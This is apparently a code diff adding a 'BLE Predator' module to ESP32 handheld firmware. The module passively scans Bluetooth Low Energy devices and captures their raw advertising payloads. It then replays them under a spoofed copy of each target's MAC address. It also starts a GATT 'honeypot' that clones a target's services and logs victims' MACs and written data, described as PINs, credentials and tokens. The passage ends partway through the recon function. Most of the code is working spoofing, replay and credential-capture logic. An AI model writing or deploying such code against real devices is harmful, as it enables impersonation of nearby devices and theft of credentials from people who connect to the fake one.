@@ -14,6 +14,7 @@
 #include <BLEAdvertising.h>
 #include <SPI.h>
 #include "esp_gap_ble_api.h"
+#include "esp_gatts_api.h"
 #include "esp_bt_main.h"
 #include "esp_bt.h"
 #include "esp_wifi.h"
@@ -9263,3 +9264,2844 @@ void cleanup() {
 }
 
 }  // namespace BleDucky
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// BLE PREDATOR - Unified Listen / Find / Attack Module
+// Phase 1: LISTEN  — Passive BLE scan with device classification
+// Phase 2: TARGET  — Detail overlay with full ADV payload hex dump
+// Phase 3: ATTACK  — Exact MAC + payload replay via raw ESP-IDF
+//
+// First ESP32 handheld to do standalone BLE capture-and-replay.
+// Replaces BLE Scanner + BLE Sniffer with a full attack pipeline.
+// Created: 2026-03-23
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Forward declaration — defined in HaleHound-CYD.ino (global scope)
+extern bool isOffensiveAllowed();
+
+namespace BlePredator {
+
+// ── Constants ─────────────────────────────────────────────────────────────
+
+#define BP_MAX_DEVICES     62
+#define BP_MAX_VISIBLE     ((SCALE_Y(180)) / SCALE_H(20))
+#define BP_ITEM_HEIGHT     SCALE_H(20)
+#define BP_SKULL_Y         (SCREEN_HEIGHT - 48)
+#define BP_SKULL_NUM       8
+#define BP_BAR_Y           (SCREEN_HEIGHT - 30)
+
+// ── Phases ────────────────────────────────────────────────────────────────
+
+enum PredPhase : uint8_t {
+    PHASE_LISTEN = 0,
+    PHASE_TARGET,
+    PHASE_ATTACK,
+    PHASE_RECON,
+    PHASE_HONEYPOT
+};
+
+// ── Filter modes ──────────────────────────────────────────────────────────
+
+enum PredFilter : uint8_t {
+    PF_ALL = 0,
+    PF_NAMED,
+    PF_STRONG,
+    PF_COUNT
+};
+static const char* pfNames[] = {"ALL", "NAMED", "STRONG"};
+
+// ── Replay mode ───────────────────────────────────────────────────────────
+
+enum ReplayMode : uint8_t {
+    RM_SINGLE = 0,
+    RM_ROTATE
+};
+
+// ── Dwell presets ─────────────────────────────────────────────────────────
+
+static const uint16_t dwellPresets[] = {100, 500, 2000};
+#define BP_DWELL_COUNT 3
+
+// ── GATT Honeypot constants ─────────────────────────────────────────────
+
+#define HP_MAX_SERVICES     8
+#define HP_MAX_CHARS        32    // Total across all services
+#define HP_MAX_READ_VAL     20    // Max cached read response bytes
+#define HP_MAX_LOOT         32    // Circular loot buffer
+#define HP_RECON_CONN_TIMEOUT_MS   5000
+#define HP_RECON_DISC_TIMEOUT_MS  10000
+
+// Loot event types
+#define HP_EVT_CONNECT     0
+#define HP_EVT_READ        1
+#define HP_EVT_WRITE       2
+#define HP_EVT_DISCONNECT  3
+
+// ── GATT Honeypot structs ───────────────────────────────────────────────
+
+struct HpCharInfo {
+    uint8_t  uuid128[16];    // Full 128-bit UUID
+    uint16_t uuid16;         // 16-bit shorthand (0 if 128-bit only)
+    uint8_t  properties;     // ESP_GATT_CHAR_PROP_BIT_READ|WRITE|NOTIFY etc
+    uint8_t  cachedVal[HP_MAX_READ_VAL]; // Default read response from real device
+    uint8_t  cachedValLen;
+    uint16_t handle;         // Assigned by ESP GATTS during creation
+    uint8_t  svcIdx;         // Which service this belongs to
+};
+
+struct HpServiceInfo {
+    uint8_t  uuid128[16];
+    uint16_t uuid16;
+    uint8_t  charStart;      // Index into hpChars[] array
+    uint8_t  charCount;
+    uint16_t handle;         // Assigned by ESP GATTS
+};
+
+struct HpLootEntry {
+    uint32_t timestamp;       // millis()
+    uint8_t  victimMAC[6];    // Who connected
+    uint16_t charHandle;      // Which characteristic
+    uint8_t  type;            // HP_EVT_CONNECT, _READ, _WRITE, _DISCONNECT
+    uint8_t  data[20];        // Written data (PINs, creds, tokens)
+    uint8_t  dataLen;
+};
+
+// ── Device struct (91 bytes) ──────────────────────────────────────────────
+
+struct ReconDevice {
+    uint8_t  mac[6];
+    uint8_t  addrType;        // BLE_ADDR_TYPE_PUBLIC / RANDOM
+    uint8_t  payload[31];     // Full raw ADV payload
+    uint8_t  payloadLen;
+    int8_t   rssi;
+    int8_t   rssiMin;
+    int8_t   rssiMax;
+    char     name[17];
+    char     vendor[8];
+    uint16_t companyId;
+    uint32_t firstSeen;
+    uint32_t lastSeen;
+    uint16_t frameCount;
+    uint8_t  mfgData[8];
+    uint8_t  mfgDataLen;
+    bool     hasName;
+    bool     randomMAC;
+    bool     selected;
+};
+
+// ── Heap-allocated state ──────────────────────────────────────────────────
+
+struct PredatorState {
+    ReconDevice devices[BP_MAX_DEVICES];
+    int          deviceCount;
+    int          currentIndex;
+    int          listStartIndex;
+    uint32_t     totalFrames;
+
+    BLEScan*     pScan;
+    bool         scanning;
+    uint32_t     scanStartTime;
+    PredFilter   filter;
+
+    // Volatile pending queue (callback → main loop)
+    volatile bool pendingReady;
+    uint8_t      pendingMAC[6];
+    uint8_t      pendingAddrType;
+    int8_t       pendingRSSI;
+    char         pendingName[17];
+    bool         pendingHasName;
+    uint8_t      pendingMfgData[8];
+    uint8_t      pendingMfgLen;
+    uint8_t      pendingPayload[31];
+    uint8_t      pendingPayloadLen;
+
+    // Replay state
+    volatile bool replaying;
+    volatile bool replayTaskRunning;
+    volatile uint32_t replayCount;
+    volatile uint32_t rateWindowCount;
+    volatile uint16_t replayRate;
+    uint16_t     replayDwellMs;
+    uint8_t      dwellIndex;
+    ReplayMode   replayMode;
+    int          replayRotateIdx;
+    TaskHandle_t replayTaskHandle;
+
+    // UI / phase
+    PredPhase    phase;
+    bool         exitRequested;
+    bool         initialized;
+    bool         staticDrawn;
+    bool         listenDirty;       // True when device list needs redraw
+    int          detailIdx;
+    int          targetBtnY;        // Y position of buttons in TARGET overlay
+    unsigned long lastDisplayUpdate;
+    unsigned long lastIconTap;
+
+    // GATT Honeypot — RECON results
+    HpServiceInfo hpSvcs[HP_MAX_SERVICES];
+    HpCharInfo    hpChars[HP_MAX_CHARS];
+    uint8_t       hpSvcCount;
+    uint8_t       hpCharCount;
+    bool          hpReconDone;
+
+    // GATT Honeypot — runtime state
+    HpLootEntry   hpLoot[HP_MAX_LOOT];
+    uint8_t       hpLootCount;
+    uint8_t       hpLootScroll;     // Display scroll offset
+    uint8_t       hpConnCount;      // Total connections received
+    bool          hpActive;         // Honeypot running
+    uint16_t      hpConnId;         // Current GATT connection ID
+    uint16_t      hpGattsIf;        // GATTS interface from REG_EVT
+    uint8_t       hpBuildStep;      // Service/char build state machine index
+    uint8_t       hpBuildCharIdx;   // Current char being built
+    bool          hpAdvStarted;     // Advertising started
+    uint8_t       hpVictimMAC[6];   // Current connected victim MAC
+    char          hpStatusMsg[32];  // Status message (SAVED, ERROR, etc)
+    uint32_t      hpStatusTime;     // When status message was set (0 = none)
+    uint16_t      hpStatusColor;    // Color of status message
+};
+
+static PredatorState* S = nullptr;
+static bool bpWaitForRelease = false;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FORWARD DECLARATIONS
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawIconBar();
+static void drawHeader();
+static void drawDeviceList();
+static void drawTargetOverlay();
+static void drawAttackView();
+static void drawSkulls();
+static void drawCounterBar();
+static void startReplayTask();
+static void stopReplayTask();
+static void startReplay();
+static void stopReplay();
+static void startRecon();
+static void startHoneypot();
+static void stopHoneypot();
+static void drawReconView();
+static void hpSetStatus(const char* msg, uint16_t color);
+static void drawHoneypotStatic();
+static void drawHoneypotLoot();
+static void handleReconTouch();
+static void handleHoneypotTouch();
+static void goBackToListen();
+static void hpSaveLootToSD();
+
+// ═══════════════════════════════════════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void bpMacToStr(const uint8_t* mac, char* buf, size_t len) {
+    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+static const char* bpProximityStr(int rssi) {
+    if (rssi > -40) return "< 1m";
+    if (rssi > -55) return "1-3m";
+    if (rssi > -70) return "3-8m";
+    if (rssi > -85) return "8-15m";
+    return "> 15m";
+}
+
+static void bpDrawRssiBar(int x, int y, int rssi) {
+    int bars = 0;
+    if (rssi > -40) bars = 5;
+    else if (rssi > -55) bars = 4;
+    else if (rssi > -65) bars = 3;
+    else if (rssi > -75) bars = 2;
+    else if (rssi > -90) bars = 1;
+
+    for (int i = 0; i < 5; i++) {
+        int barH = 3 + i * 2;
+        int barY = y + (12 - barH);
+        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
+        tft.fillRect(x + i * 4, barY, 3, barH, color);
+    }
+}
+
+// Gradient cyan → hot pink (same curve as AirTagReplay)
+static uint16_t bpGradientColor(float ratio) {
+    if (ratio > 1.0f) ratio = 1.0f;
+    if (ratio < 0.0f) ratio = 0.0f;
+    uint8_t r = (uint8_t)(ratio * 255);
+    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
+    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
+    return tft.color565(r, g, b);
+}
+
+static const char* bpAddrTypeStr(uint8_t t) {
+    switch (t) {
+        case BLE_ADDR_TYPE_PUBLIC:     return "Public";
+        case BLE_ADDR_TYPE_RANDOM:     return "Random";
+        case BLE_ADDR_TYPE_RPA_PUBLIC: return "RPA(Pub)";
+        case BLE_ADDR_TYPE_RPA_RANDOM: return "RPA(Rnd)";
+        default:                       return "Unknown";
+    }
+}
+
+// OUI vendor lookup (same as BleSniffer)
+static const char* bpLookupVendor(uint8_t* mac) {
+    if (mac[0] & 0x02) return "Random";
+    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB3) return "Apple";
+    if (mac[0] == 0xF0 && mac[1] == 0x18 && mac[2] == 0x98) return "Apple";
+    if (mac[0] == 0xAC && mac[1] == 0xDE && mac[2] == 0x48) return "Apple";
+    if (mac[0] == 0xA4 && mac[1] == 0x83 && mac[2] == 0xE7) return "Apple";
+    if (mac[0] == 0x3C && mac[1] == 0x06 && mac[2] == 0x30) return "Apple";
+    if (mac[0] == 0x14 && mac[1] == 0x98 && mac[2] == 0x77) return "Apple";
+    if (mac[0] == 0xDC && mac[1] == 0xA4 && mac[2] == 0xCA) return "Apple";
+    if (mac[0] == 0x78 && mac[1] == 0x7B && mac[2] == 0x8A) return "Apple";
+    if (mac[0] == 0x38 && mac[1] == 0xC9 && mac[2] == 0x86) return "Apple";
+    if (mac[0] == 0xBC && mac[1] == 0x6C && mac[2] == 0x21) return "Apple";
+    if (mac[0] == 0x40 && mac[1] == 0xB3 && mac[2] == 0x95) return "Apple";
+    if (mac[0] == 0x6C && mac[1] == 0x94 && mac[2] == 0xF8) return "Apple";
+    if (mac[0] == 0x00 && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
+    if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x6C) return "Samsng";
+    if (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x8A) return "Samsng";
+    if (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x37) return "Samsng";
+    if (mac[0] == 0xE8 && mac[1] == 0x50 && mac[2] == 0x8B) return "Samsng";
+    if (mac[0] == 0x8C && mac[1] == 0x77 && mac[2] == 0x12) return "Samsng";
+    if (mac[0] == 0xCC && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
+    if (mac[0] == 0x3C && mac[1] == 0x5A && mac[2] == 0xB4) return "Google";
+    if (mac[0] == 0xF4 && mac[1] == 0xF5 && mac[2] == 0xD8) return "Google";
+    if (mac[0] == 0x54 && mac[1] == 0x60 && mac[2] == 0x09) return "Google";
+    if (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x21) return "Intel";
+    if (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x64) return "Intel";
+    if (mac[0] == 0x68 && mac[1] == 0x05 && mac[2] == 0xCA) return "Intel";
+    if (mac[0] == 0x3C && mac[1] == 0x6A && mac[2] == 0xA7) return "Intel";
+    if (mac[0] == 0x80 && mac[1] == 0x86 && mac[2] == 0xF2) return "Intel";
+    if (mac[0] == 0x24 && mac[1] == 0x0A && mac[2] == 0xC4) return "ESP";
+    if (mac[0] == 0xA4 && mac[1] == 0xCF && mac[2] == 0x12) return "ESP";
+    if (mac[0] == 0x30 && mac[1] == 0xAE && mac[2] == 0xA4) return "ESP";
+    if (mac[0] == 0xEC && mac[1] == 0xFA && mac[2] == 0xBC) return "ESP";
+    if (mac[0] == 0x08 && mac[1] == 0x3A && mac[2] == 0xF2) return "ESP";
+    if (mac[0] == 0x88 && mac[1] == 0x57 && mac[2] == 0x21) return "ESP";
+    if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0xF2) return "Msft";
+    if (mac[0] == 0x28 && mac[1] == 0x18 && mac[2] == 0x78) return "Msft";
+    if (mac[0] == 0x7C && mac[1] == 0x1E && mac[2] == 0x52) return "Msft";
+    if (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0x7A) return "Qcomm";
+    if (mac[0] == 0x00 && mac[1] == 0x10 && mac[2] == 0x18) return "Brcm";
+    if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C) return "Rtk";
+    if (mac[0] == 0x00 && mac[1] == 0x9A && mac[2] == 0xCD) return "Huawei";
+    if (mac[0] == 0x00 && mac[1] == 0x46 && mac[2] == 0x4B) return "Huawei";
+    if (mac[0] == 0x48 && mac[1] == 0x46 && mac[2] == 0xC1) return "Huawei";
+    return "???";
+}
+
+// Extract company ID from manufacturer data (first 2 bytes LE)
+static uint16_t bpExtractCompanyId(uint8_t* mfgData, uint8_t len) {
+    if (len < 2) return 0xFFFF;
+    return mfgData[0] | (mfgData[1] << 8);
+}
+
+// Device display label (from ble_database.h 94-company lookup)
+static const char* bpDevLabel(uint16_t companyId, bool hasName) {
+    if (companyId != 0xFFFF) {
+        const char* name = lookupCompanyName(companyId);
+        if (name) return name;
+    }
+    return hasName ? "Named" : "---";
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FILTER
+// ═══════════════════════════════════════════════════════════════════════════
+
+static bool bpPassesFilter(ReconDevice* d) {
+    switch (S->filter) {
+        case PF_NAMED:  return d->hasName;
+        case PF_STRONG: return d->rssi > -60;
+        default:        return true;
+    }
+}
+
+static int bpCountFiltered() {
+    if (S->filter == PF_ALL) return S->deviceCount;
+    int count = 0;
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (bpPassesFilter(&S->devices[i])) count++;
+    }
+    return count;
+}
+
+// Get real device index for a filtered position
+static int bpFilteredToReal(int filtIdx) {
+    int seen = 0;
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (!bpPassesFilter(&S->devices[i])) continue;
+        if (seen == filtIdx) return i;
+        seen++;
+    }
+    return -1;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DEVICE MANAGEMENT
+// ═══════════════════════════════════════════════════════════════════════════
+
+static int bpFindDevice(const uint8_t* mac) {
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (memcmp(S->devices[i].mac, mac, 6) == 0) return i;
+    }
+    return -1;
+}
+
+static void bpAddOrUpdate(uint8_t* mac, uint8_t addrType, int8_t rssi,
+                           const char* name, bool hasName,
+                           uint8_t* mfgData, uint8_t mfgLen,
+                           uint8_t* payload, uint8_t payloadLen) {
+    uint32_t now = millis();
+    int idx = bpFindDevice(mac);
+
+    if (idx >= 0) {
+        // Update existing
+        ReconDevice* d = &S->devices[idx];
+        d->rssi = rssi;
+        if (rssi < d->rssiMin) d->rssiMin = rssi;
+        if (rssi > d->rssiMax) d->rssiMax = rssi;
+        d->lastSeen = now;
+        d->frameCount++;
+        if (hasName && !d->hasName) {
+            strncpy(d->name, name, 16);
+            d->name[16] = '\0';
+            d->hasName = true;
+        }
+        // Update payload if better data
+        if (payloadLen > d->payloadLen) {
+            memcpy(d->payload, payload, payloadLen);
+            d->payloadLen = payloadLen;
+        }
+        if (mfgLen > 0 && d->mfgDataLen == 0) {
+            uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
+            memcpy(d->mfgData, mfgData, copyLen);
+            d->mfgDataLen = copyLen;
+            uint16_t cid = bpExtractCompanyId(mfgData, mfgLen);
+            if (cid != 0xFFFF) d->companyId = cid;
+        }
+        return;
+    }
+
+    // Add new device
+    if (S->deviceCount >= BP_MAX_DEVICES) return;
+
+    ReconDevice* d = &S->devices[S->deviceCount];
+    memcpy(d->mac, mac, 6);
+    d->addrType = addrType;
+    d->rssi = rssi;
+    d->rssiMin = rssi;
+    d->rssiMax = rssi;
+    d->firstSeen = now;
+    d->lastSeen = now;
+    d->frameCount = 1;
+    d->randomMAC = (mac[0] & 0x02) != 0;
+    d->selected = false;
+
+    if (payloadLen > 0) {
+        uint8_t cpLen = payloadLen > 31 ? 31 : payloadLen;
+        memcpy(d->payload, payload, cpLen);
+        d->payloadLen = cpLen;
+    } else {
+        d->payloadLen = 0;
+    }
+
+    if (hasName) {
+        strncpy(d->name, name, 16);
+        d->name[16] = '\0';
+        d->hasName = true;
+    } else {
+        d->name[0] = '\0';
+        d->hasName = false;
+    }
+
+    strncpy(d->vendor, bpLookupVendor(mac), 7);
+    d->vendor[7] = '\0';
+
+    if (mfgLen > 0) {
+        uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
+        memcpy(d->mfgData, mfgData, copyLen);
+        d->mfgDataLen = copyLen;
+        d->companyId = bpExtractCompanyId(mfgData, mfgLen);
+    } else {
+        d->mfgDataLen = 0;
+        d->companyId = 0xFFFF;
+    }
+
+    S->deviceCount++;
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s pld:%d\n",
+                  S->deviceCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+                  rssi, bpDevLabel(d->companyId, d->hasName), d->payloadLen);
+    #endif
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// BLE SCAN CALLBACK (ISR context → volatile queue)
+// ═══════════════════════════════════════════════════════════════════════════
+
+class PredatorCallbacks : public BLEAdvertisedDeviceCallbacks {
+    void onResult(BLEAdvertisedDevice advertisedDevice) override {
+        if (S->pendingReady) return;  // Queue full, skip frame
+
+        // MAC + address type
+        const uint8_t* addr = *advertisedDevice.getAddress().getNative();
+        memcpy(S->pendingMAC, addr, 6);
+        S->pendingAddrType = advertisedDevice.getAddressType();
+        S->pendingRSSI = advertisedDevice.getRSSI();
+
+        // Name
+        if (advertisedDevice.haveName() && advertisedDevice.getName().length() > 0) {
+            strncpy(S->pendingName, advertisedDevice.getName().c_str(), 16);
+            S->pendingName[16] = '\0';
+            S->pendingHasName = true;
+        } else {
+            S->pendingName[0] = '\0';
+            S->pendingHasName = false;
+        }
+
+        // Manufacturer data
+        if (advertisedDevice.haveManufacturerData()) {
+            std::string mfg = advertisedDevice.getManufacturerData();
+            S->pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
+            memcpy(S->pendingMfgData, mfg.data(), S->pendingMfgLen);
+        } else {
+            S->pendingMfgLen = 0;
+        }
+
+        // Full raw ADV payload (the key capture for replay)
+        uint8_t* pld = advertisedDevice.getPayload();
+        size_t pldLen = advertisedDevice.getPayloadLength();
+        if (pld && pldLen > 0) {
+            S->pendingPayloadLen = pldLen > 31 ? 31 : pldLen;
+            memcpy(S->pendingPayload, pld, S->pendingPayloadLen);
+        } else {
+            S->pendingPayloadLen = 0;
+        }
+
+        S->pendingReady = true;
+    }
+};
+
+static PredatorCallbacks predatorCB;
+
+// Scan completion → auto-restart for continuous passive listening
+static void bpScanComplete(BLEScanResults results) {
+    if (S && S->scanning && S->pScan) {
+        S->pScan->start(5, bpScanComplete, false);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// REPLAY ENGINE — Raw ESP-IDF broadcast (same pattern as AirTagReplay)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void doReplayBroadcast(ReconDevice& dev) {
+    esp_ble_gap_stop_advertising();
+
+    // Set MAC — for random addresses, use directly
+    // For public addresses, OR the top 2 bits of byte[5] with 0xC0
+    uint8_t replayMac[6];
+    memcpy(replayMac, dev.mac, 6);
+    if (dev.addrType == BLE_ADDR_TYPE_PUBLIC) {
+        replayMac[0] |= 0xC0;  // Force random-static for public MAC replay
+    }
+    esp_ble_gap_set_rand_addr(replayMac);
+
+    // Send raw payload
+    esp_ble_gap_config_adv_data_raw(dev.payload, dev.payloadLen > 0 ? dev.payloadLen : 31);
+    delay(1);
+
+    const esp_ble_adv_params_t advP = {
+        .adv_int_min = 0x20,
+        .adv_int_max = 0x20,
+        .adv_type = ADV_TYPE_NONCONN_IND,
+        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
+        .channel_map = ADV_CHNL_ALL,
+        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+    };
+    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);
+
+    delay(S->replayDwellMs);
+    esp_ble_gap_stop_advertising();
+
+    S->replayCount++;
+    S->rateWindowCount++;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CORE 0 REPLAY TASK
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void predReplayTask(void* param) {
+    S->replayTaskRunning = true;
+    unsigned long rateStart = millis();
+
+    while (S->replaying) {
+        if (S->replayMode == RM_SINGLE) {
+            // Find first selected device
+            int targetIdx = -1;
+            for (int i = 0; i < S->deviceCount; i++) {
+                if (S->devices[i].selected && S->devices[i].payloadLen > 0) {
+                    targetIdx = i;
+                    break;
+                }
+            }
+            if (targetIdx < 0) { S->replaying = false; break; }
+            doReplayBroadcast(S->devices[targetIdx]);
+        } else {
+            // RM_ROTATE: cycle through all selected devices
+            int startSearch = S->replayRotateIdx;
+            bool found = false;
+            for (int i = 0; i < S->deviceCount; i++) {
+                int idx = (startSearch + i) % S->deviceCount;
+                if (S->devices[idx].selected && S->devices[idx].payloadLen > 0) {
+                    doReplayBroadcast(S->devices[idx]);
+                    S->replayRotateIdx = (idx + 1) % S->deviceCount;
+                    found = true;
+                    break;
+                }
+            }
+            if (!found) { S->replaying = false; break; }
+        }
+
+        // Rate calculation (1-second sliding window)
+        unsigned long now = millis();
+        if (now - rateStart >= 1000) {
+            S->replayRate = (uint16_t)S->rateWindowCount;
+            S->rateWindowCount = 0;
+            rateStart = now;
+        }
+
+        vTaskDelay(1);
+    }
+
+    S->replayTaskRunning = false;
+    vTaskDelete(NULL);
+}
+
+static void startReplayTask() {
+    if (S->replayTaskHandle != NULL) return;
+    xTaskCreatePinnedToCore(predReplayTask, "blePred", 4096, NULL, 1, &S->replayTaskHandle, 0);
+}
+
+static void stopReplayTask() {
+    S->replaying = false;
+    if (S->replayTaskHandle == NULL) return;
+
+    unsigned long start = millis();
+    while (S->replayTaskRunning && (millis() - start < 3000)) {
+        delay(10);
+    }
+    if (S->replayTaskRunning) {
+        vTaskDelete(S->replayTaskHandle);
+    }
+
+    S->replayTaskHandle = NULL;
+    S->replayTaskRunning = false;
+    esp_ble_gap_stop_advertising();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// START / STOP REPLAY (Phase transitions)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void startReplay() {
+    // Count selected devices with payload
+    int selCount = 0;
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (S->devices[i].selected && S->devices[i].payloadLen > 0) selCount++;
+    }
+    if (selCount == 0) return;
+
+    // Auto-set replay mode
+    S->replayMode = (selCount > 1) ? RM_ROTATE : RM_SINGLE;
+    S->replayRotateIdx = 0;
+
+    // Stop scanning
+    if (S->pScan) {
+        S->pScan->stop();
+        S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
+        S->pScan = nullptr;
+    }
+    S->scanning = false;
+    BLEDevice::deinit(false);
+    delay(100);
+
+    // Re-init for advertising
+    releaseClassicBtMemory();
+    BLEDevice::init("HaleHound");
+    delay(150);
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
+    S->replaying = true;
+    S->replayCount = 0;
+    S->replayRate = 0;
+    S->rateWindowCount = 0;
+    S->staticDrawn = false;
+
+    // Phase transition to ATTACK
+    S->phase = PHASE_ATTACK;
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
+    drawIconBar();
+    drawAttackView();
+
+    startReplayTask();
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] Attack started, %d targets, mode=%s, dwell=%dms\n",
+                  selCount, S->replayMode == RM_SINGLE ? "SINGLE" : "ROTATE", S->replayDwellMs);
+    #endif
+}
+
+static void stopReplay() {
+    stopReplayTask();
+
+    // Re-init for scanning
+    BLEDevice::deinit(false);
+    delay(100);
+
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    S->pScan = BLEDevice::getScan();
+    if (S->pScan) {
+        S->pScan->setActiveScan(false);
+        S->pScan->setInterval(100);
+        S->pScan->setWindow(99);
+        S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
+        S->scanning = true;
+        S->pScan->start(5, bpScanComplete, false);
+    }
+
+    S->staticDrawn = false;
+    S->phase = PHASE_LISTEN;
+
+    // Redraw listen UI
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
+    drawIconBar();
+    drawHeader();
+    drawDeviceList();
+
+    #if CYD_DEBUG
+    Serial.println("[PREDATOR] Attack stopped, back to LISTEN");
+    #endif
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 4: RECON — GATT Client Enumeration
+// Connect to target, discover all services/characteristics, build clone table
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawReconView() {
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);
+
+    tft.setFreeFont(NULL);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(65), SCALE_Y(42));
+    tft.print(">> RECON <<");
+}
+
+static void drawReconStatus(int line, const char* msg, uint16_t color) {
+    int y = SCALE_Y(68) + line * SCALE_H(14);
+    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
+    tft.setTextSize(1);
+    tft.setTextColor(color, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(8), y + 2);
+    tft.print(msg);
+}
+
+static void drawReconService(int line, uint16_t uuid16, const uint8_t* uuid128, uint8_t charCount) {
+    int y = SCALE_Y(68) + line * SCALE_H(14);
+    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(8), y + 2);
+
+    if (uuid16 != 0) {
+        const char* svcName = lookupServiceName(uuid16);
+        if (svcName) {
+            tft.printf("SVC 0x%04X (%s) [%d]", uuid16, svcName, charCount);
+        } else {
+            tft.printf("SVC 0x%04X [%d chars]", uuid16, charCount);
+        }
+    } else {
+        // Show first 4 bytes of 128-bit UUID
+        tft.printf("SVC %02X%02X%02X%02X... [%d]",
+                   uuid128[12], uuid128[13], uuid128[14], uuid128[15], charCount);
+    }
+}
+
+static void drawReconChar(int line, HpCharInfo* c) {
+    int y = SCALE_Y(68) + line * SCALE_H(14);
+    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(15), y + 2);
+
+    char propStr[8];
+    int pi = 0;
+    if (c->properties & ESP_GATT_CHAR_PROP_BIT_READ)   propStr[pi++] = 'R';
+    if (c->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)  propStr[pi++] = 'W';
+    if (c->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) propStr[pi++] = 'w';
+    if (c->properties & ESP_GATT_CHAR_PROP_BIT_NOTIFY) propStr[pi++] = 'N';
+    if (c->properties & ESP_GATT_CHAR_PROP_BIT_INDICATE) propStr[pi++] = 'I';
+    propStr[pi] = '\0';
+
+    if (c->uuid16 != 0) {
+        tft.printf("  0x%04X %s", c->uuid16, propStr);
+    } else {
+        tft.printf("  %02X%02X..%02X%02X %s",
+                   c->uuid128[12], c->uuid128[13], c->uuid128[14], c->uuid128[15], propStr);
+    }
+}
+
+static void startRecon() {
+    int realIdx = bpFilteredToReal(S->detailIdx);
+    if (realIdx < 0 || realIdx >= S->deviceCount) return;
+
+    ReconDevice* target = &S->devices[realIdx];
+
+    // Clear honeypot state from any previous run
+    S->hpSvcCount = 0;
+    S->hpCharCount = 0;
+    S->hpReconDone = false;
+    S->hpLootCount = 0;
+    S->hpLootScroll = 0;
+    S->hpConnCount = 0;
+    S->hpActive = false;
+    S->hpAdvStarted = false;
+    memset(S->hpSvcs, 0, sizeof(S->hpSvcs));
+    memset(S->hpChars, 0, sizeof(S->hpChars));
+    memset(S->hpLoot, 0, sizeof(S->hpLoot));
+
+    // Phase transition
+    S->phase = PHASE_RECON;
